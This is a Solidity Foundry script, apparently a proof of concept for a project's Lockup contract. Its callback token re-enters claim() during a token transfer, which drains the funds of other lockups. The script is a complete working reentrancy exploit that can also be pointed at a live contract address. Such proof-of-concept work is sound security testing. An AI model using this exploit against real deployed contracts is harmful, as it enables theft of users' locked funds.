// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import { Script, console } from "forge-std/Script.sol";
import { Lockup } from "../src/Lockup.sol";
import { LockupDeployer } from "./LockupDeployer.s.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { CallbackToken } from "../src/fixtures/CallbackToken.sol";

contract LockupExploit is LockupDeployer {

    Lockup lockup;

    function runExploit(address lockupAddr) public {

        if (lockupAddr == address(0)) {
            // Assume that `lockupAddr == 0` means the lockup needs to be deployed
            deploy();
            lockup = deployedLockup;
        } else {
            lockup = Lockup(lockupAddr);
        }
        
        address owner = msg.sender; // TODO is this the right way to get the owner?

        CallbackToken callbackToken = new CallbackToken("CallbackToken", "CallbackToken", owner);
        callbackToken.mint(address(this), 100 ether);
        callbackToken.approve(address(lockup), type(uint256).max);
        lockup.lockup(callbackToken, address(this), 10 ether);
        lockup.lockup(callbackToken, address(this), 10 ether);

        vm.warp(block.timestamp + lockup.LOCKUP_PERIOD() + 1);

        assert(callbackToken.balanceOf(address(lockup)) == 20 ether);

        uint256[] memory ids = new uint256[](1);
        ids[0] = 1;
        lockup.claim(ids);

        assert(callbackToken.balanceOf(address(lockup)) == 0 ether);

        (,,,, uint256 amount) = lockup.lockups(2);

        assert(amount != 0);
    }

    bool alreadyCalled;
    function ERC20Callback(address from, uint256 value) external {
        if (alreadyCalled) return;
        alreadyCalled = true;

        uint256[] memory ids = new uint256[](1);
        ids[0] = 1;
        lockup.claim(ids);
    }
}